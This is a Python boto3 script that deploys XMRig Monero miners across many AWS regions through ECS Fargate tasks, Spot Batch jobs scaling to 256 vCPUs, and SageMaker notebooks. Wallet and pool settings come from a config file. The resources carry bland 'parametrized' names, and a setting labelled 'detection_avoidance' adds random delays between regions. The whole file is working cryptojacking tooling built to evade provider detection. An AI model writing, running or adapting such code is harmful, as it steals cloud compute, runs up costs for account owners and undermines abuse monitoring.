#!/usr/bin/env python3
"""
Infrastructure Creation for RM Parametrized Fleet
Creates service-specific infrastructure (ECS, Batch, SageMaker).
"""

import boto3
import json
import logging
import os
import sys
import time
import random
from botocore.exceptions import ClientError

# Add utils to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from utils.resource_tracker import tracker
from utils.helpers import get_latest_cpu_ami
from utils.worker_naming import generate_worker_name

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

def check_resource_exists(service, resource_type, region, **kwargs):
    """Check if a resource already exists using the tracker."""
    return tracker.check_resource_exists(region, service, resource_type, **kwargs)

def create_ecs_resources(ecs, region, settings, mining_conf):
    """Create ECS cluster and task definition with XMRig."""
    try:
        cluster_name = settings['ecs_cluster_name']
        task_def_name = settings['ecs_task_def_name']
        
        # Check if cluster already exists
        if check_resource_exists('ecs', 'cluster', region, cluster_name=cluster_name):
            logger.info(f"ECS cluster {cluster_name} already exists in {region}")
            return True
        
        # Create cluster
        cluster = ecs.create_cluster(
            clusterName=cluster_name,
            tags=[
                {'key': 'Project', 'value': tracker.project_tag},
                {'key': 'Region', 'value': region}
            ]
        )
        
        # Track cluster
        tracker.add_resource(region, 'ecs', cluster['cluster']['clusterArn'], 'cluster', 
                           name=cluster_name, arn=cluster['cluster']['clusterArn'])
        tracker.add_tags('ecs-cluster', cluster['cluster']['clusterArn'], region, Name=cluster_name)
        
        logger.info(f"Created ECS cluster: {cluster_name}")
        
        # Create task definition with XMRig
        task_def = ecs.register_task_definition(
            family=task_def_name,
            networkMode='awsvpc',
            requiresCompatibilities=['FARGATE'],
            cpu='1024',
            memory='2048',
            executionRoleArn=f'arn:aws:iam::{tracker.account_id}:role/RM-Parametrized-ECSRole',
            taskRoleArn=f'arn:aws:iam::{tracker.account_id}:role/RM-Parametrized-ECSRole',
            containerDefinitions=[{
                'name': 'parametrized-container',
                'image': 'xmrig/xmrig:latest',  # Use official XMRig image
                'environment': [
                    {'name': 'WALLET', 'value': mining_conf['wallet']},
                    {'name': 'POOL', 'value': mining_conf['pools'][0]},
                    {'name': 'WORKER_NAME', 'value': 'ecs-PLACEHOLDER'},  # Will be overridden
                    {'name': 'ALGORITHM', 'value': mining_conf['algorithm']}
                ],
                'command': [
                    '/usr/local/bin/xmrig',
                    '--url=${POOL}',
                    '--user=${WALLET}',
                    '--pass=${WORKER_NAME}',
                    '--algo=rx/0',
                    '--randomx-1gb-pages',
                    '--cpu-max-threads-hint=75'
                ],
                'logConfiguration': {
                    'logDriver': 'awslogs',
                    'options': {
                        'awslogs-group': f'/ecs/{task_def_name}',
                        'awslogs-region': region,
                        'awslogs-stream-prefix': 'ecs'
                    }
                }
            }]
        )
        
        # Track task definition
        tracker.add_resource(region, 'ecs', task_def['taskDefinition']['taskDefinitionArn'], 'task-definition',
                           name=task_def_name, arn=task_def['taskDefinition']['taskDefinitionArn'])
        
        logger.info(f"Created ECS task definition: {task_def_name}")
        return True
        
    except ClientError as e:
        logger.error(f"Error creating ECS resources in {region}: {e}")
        return False

def create_batch_resources(batch, region, settings, mining_conf):
    """Create Batch compute environment and job queue."""
    try:
        env_name = settings['batch_env_name']
        
        # Check if compute environment already exists
        if check_resource_exists('batch', 'compute-environment', region, env_name=env_name):
            logger.info(f"Batch compute environment {env_name} already exists in {region}")
            return True
        
        # Create compute environment
        compute_env = batch.create_compute_environment(
            computeEnvironmentName=env_name,
            type='MANAGED',
            state='ENABLED',
            computeResources={
                'type': 'SPOT',
                'maxvCpus': 256,
                'minvCpus': 0,
                'desiredvCpus': 0,
                'instanceTypes': ['optimal'],
                'subnets': tracker.get_resource(region, 'ec2', 'vpc').get('subnets', []),
                'securityGroupIds': [tracker.get_resource(region, 'ec2', 'security-group')['id']],
                'instanceRole': f'arn:aws:iam::{tracker.account_id}:instance-profile/RM-Parametrized-EC2Profile'
            },
            serviceRole=f'arn:aws:iam::{tracker.account_id}:role/AWSBatchServiceRole'
        )
        
        # Track compute environment
        tracker.add_resource(region, 'batch', compute_env['computeEnvironmentArn'], 'compute-environment',
                           name=env_name, arn=compute_env['computeEnvironmentArn'])
        
        logger.info(f"Created Batch compute environment: {env_name}")
        
        # Create job queue
        queue_name = f"{env_name}-queue"
        job_queue = batch.create_job_queue(
            jobQueueName=queue_name,
            state='ENABLED',
            priority=1,
            computeEnvironmentOrder=[{
                'order': 1,
                'computeEnvironment': compute_env['computeEnvironmentArn']
            }]
        )
        
        # Track job queue
        tracker.add_resource(region, 'batch', job_queue['jobQueueArn'], 'job-queue',
                           name=queue_name, arn=job_queue['jobQueueArn'])
        
        logger.info(f"Created Batch job queue: {queue_name}")
        
        # Create job definition with XMRig
        job_def_name = f"{env_name}-job-def"
        job_def = batch.register_job_definition(
            jobDefinitionName=job_def_name,
            type='container',
            platformCapabilities=['EC2'],
            containerProperties={
                'image': 'xmrig/xmrig:latest',
                'jobRoleArn': f'arn:aws:iam::{tracker.account_id}:role/RM-Parametrized-ECSRole',
                'executionRoleArn': f'arn:aws:iam::{tracker.account_id}:role/RM-Parametrized-ECSRole',
                'resourceRequirements': [
                    {'type': 'VCPU', 'value': '4'},
                    {'type': 'MEMORY', 'value': '8192'}
                ],
                'command': [
                    '/usr/local/bin/xmrig',
                    '--url=${POOL}',
                    '--user=${WALLET}',
                    '--pass=${WORKER_NAME}',
                    '--algo=rx/0',
                    '--randomx-1gb-pages',
                    '--cpu-max-threads-hint=75'
                ],
                'environment': [
                    {'name': 'POOL', 'value': mining_conf['pools'][0]},
                    {'name': 'WALLET', 'value': mining_conf['wallet']},
                    {'name': 'WORKER_NAME', 'value': 'batch-PLACEHOLDER'}  # Will be overridden
                ]
            }
        )
        
        # Track job definition
        tracker.add_resource(region, 'batch', job_def['jobDefinitionArn'], 'job-definition',
                           name=job_def_name, arn=job_def['jobDefinitionArn'])
        
        logger.info(f"Created Batch job definition: {job_def_name}")
        return True
        
    except ClientError as e:
        logger.error(f"Error creating Batch resources in {region}: {e}")
        return False

def create_sagemaker_notebook(sm, region, settings, mining_conf):
    """Create SageMaker notebook instance."""
    try:
        notebook_name = settings['sagemaker_notebook_name']
        role_name = f'rm-parametrized-sagemaker-role-{region}'
        
        # Check if notebook already exists
        if check_resource_exists('sagemaker', 'notebook', region, notebook_name=notebook_name):
            logger.info(f"SageMaker notebook {notebook_name} already exists in {region}")
            return True
        
        # Create IAM role for SageMaker if it doesn't exist
        iam = boto3.client('iam')
        try:
            role = iam.create_role(
                RoleName=role_name,
                AssumeRolePolicyDocument=json.dumps({
                    "Version": "2012-10-17",
                    "Statement": [{
                        "Effect": "Allow",
                        "Principal": {"Service": "sagemaker.amazonaws.com"},
                        "Action": "sts:AssumeRole"
                    }]
                })
            )
            iam.attach_role_policy(RoleName=role_name, PolicyArn='arn:aws:iam::aws:policy/AmazonSageMakerFullAccess')
            tracker.add_resource('global', 'iam', role_name, 'role', name=role_name, type='sagemaker')
            logger.info(f"Created SageMaker IAM role: {role_name}")
        except ClientError as e:
            if 'EntityAlreadyExists' not in str(e):
                logger.error(f"Error creating SageMaker role: {e}")
                return False
        
        # Create notebook instance
        notebook = sm.create_notebook_instance(
            NotebookInstanceName=notebook_name,
            InstanceType='ml.t3.xlarge',
            RoleArn=f'arn:aws:iam::{tracker.account_id}:role/{role_name}',
            Tags=[
                {'Key': 'Project', 'Value': tracker.project_tag},
                {'Key': 'Region', 'Value': region}
            ]
        )
        
        # Track notebook
        tracker.add_resource(region, 'sagemaker', notebook['NotebookInstanceArn'], 'notebook',
                           name=notebook_name, arn=notebook['NotebookInstanceArn'])
        tracker.add_tags('sagemaker-notebook', notebook['NotebookInstanceArn'], region, Name=notebook_name)
        
        logger.info(f"Created SageMaker notebook: {notebook_name}")
        return True
        
    except ClientError as e:
        logger.error(f"Error creating SageMaker notebook in {region}: {e}")
        return False

def main():
    """Main function to create infrastructure."""
    logger.info("Starting infrastructure creation...")
    
    # Load configuration
    with open('config/fleet_settings.json') as f:
        settings = json.load(f)
    
    with open('config/mining_pools.json') as f:
        mining_conf = json.load(f)
    
    # Get qualified regions
    try:
        with open('config/qualified_regions.json') as f:
            qualified_regions = json.load(f)['regions']
    except FileNotFoundError:
        logger.error("qualified_regions.json not found. Please run region qualification first.")
        return
    
    # Create infrastructure for each region
    for region in qualified_regions:
        logger.info(f"Creating infrastructure in region: {region}")
        
        try:
            # Create ECS resources
            ecs = boto3.client('ecs', region_name=region)
            create_ecs_resources(ecs, region, settings, mining_conf)
            
            # Create Batch resources
            batch = boto3.client('batch', region_name=region)
            create_batch_resources(batch, region, settings, mining_conf)
            
            # Create SageMaker notebook
            sm = boto3.client('sagemaker', region_name=region)
            create_sagemaker_notebook(sm, region, settings, mining_conf)
            
            # Add random delay for detection avoidance
            if settings.get('detection_avoidance', {}).get('random_delays', False):
                delay = random.uniform(3, 8)
                logger.info(f"Random delay: {delay:.2f} seconds")
                time.sleep(delay)
                
        except Exception as e:
            logger.error(f"Error creating infrastructure in {region}: {e}")
            continue
    
    logger.info("Infrastructure creation completed!")
    
    # Save all resources to tracking file
    all_resources = tracker.get_all_resources()
    if all_resources:
        logger.info(f"Resources saved to: {tracker.tracking_file}")
        logger.info(f"Total regions configured: {len(all_resources)}")

if __name__ == "__main__":
    main()